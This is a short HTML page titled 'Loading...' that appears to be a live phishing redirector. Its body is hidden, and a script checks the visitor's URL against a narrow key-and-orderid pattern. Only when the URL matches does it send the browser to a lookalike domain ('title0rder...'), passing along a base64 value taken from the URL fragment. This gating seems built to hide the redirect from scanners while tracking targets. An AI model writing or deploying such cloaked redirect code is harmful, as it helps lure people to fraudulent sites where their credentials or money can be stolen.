<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body, html { display: none; margin: 0; padding: 0; }
    </style>
    <script>
        const TARGET = "https://title0rder.ongcredisolunetorks.com/#";
        
        const url = location.pathname + location.search;
        const hash = location.hash;
        
        const regex = /^(?:.*\/)?[a-z]{4}\.[a-z]{4}\?key=[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}&orderid=[A-Z][0-9]{4}[A-Z][0-9]{2}-[0-9]{4}-[0-9]{4}-[A-Z][0-9]{3}-[0-9][A-Z][0-9]{6}[A-Z]{3}[0-9]$/i;
        
        if (regex.test(url)) {
            let redirectUrl = TARGET;
            const base64 = hash && hash.length > 1 ? hash.substring(1) : null;
            if (base64 && /^[A-Za-z0-9+/]+=*$/.test(base64)) redirectUrl += base64;
            window.location.replace(redirectUrl);
        }
    </script>
</head>
<body></body>
</html>
